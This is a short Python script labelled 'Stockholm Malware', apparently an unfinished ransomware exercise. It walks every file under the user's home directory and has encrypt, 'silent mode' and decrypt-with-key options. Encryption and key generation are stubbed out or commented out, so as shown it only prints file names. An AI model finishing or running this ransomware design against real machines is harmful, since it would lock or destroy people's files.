import argparse
import os
from cryptography.fernet import Fernet

version = '1.0.0'

def parse_args():
    parser = argparse.ArgumentParser(description='Stockholm Malware')
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument('-r', type=str, help='Key to decrypt')
    group.add_argument('-s', action="store_true",  help='Encrypt with silent mode')
    group.add_argument('-v', version=f"stockholm version: {version}", action='version')
    return parser.parse_args()

def decrypt(key: str) -> None:
    print(f"Decrypting with key: {key}")

def encrypt(is_silent=False) -> None:
    # if is_silent:
    #     print("work in silent mode")
    # else:
    #     print("work in verbose mode")


    # Get all files in the home directory
    home_dir = os.path.expanduser("~")
    # print(f"Home directory: {home_dir}")
    # for file in os.listdir(home_dir):
    #     absolute_path = os.path.join(home_dir, file)
    #     print(f"File: {absolute_path}")
    #     if file == 'stockholm.py':
    #         continue
    #     if os.path.isfile(absolute_path):
    #         print(f"Encrypting file: {file}")
    #         files.append(file)
    for root, _, files in os.walk(home_dir):
        for file in files:
            absolute_path = os.path.join(root, file)
            if file == 'stockholm.py':
                continue
            if os.path.isfile(absolute_path):
                print(f"Encrypting file: {file}")
                # files.append(file)

    # key = Fernet.generate_key()
    # print(f"Key: {key}")
        

if __name__ == '__main__':
    args = parse_args()
    if args.r:
        decrypt(args.r)
    else:
        encrypt(is_silent=args.s)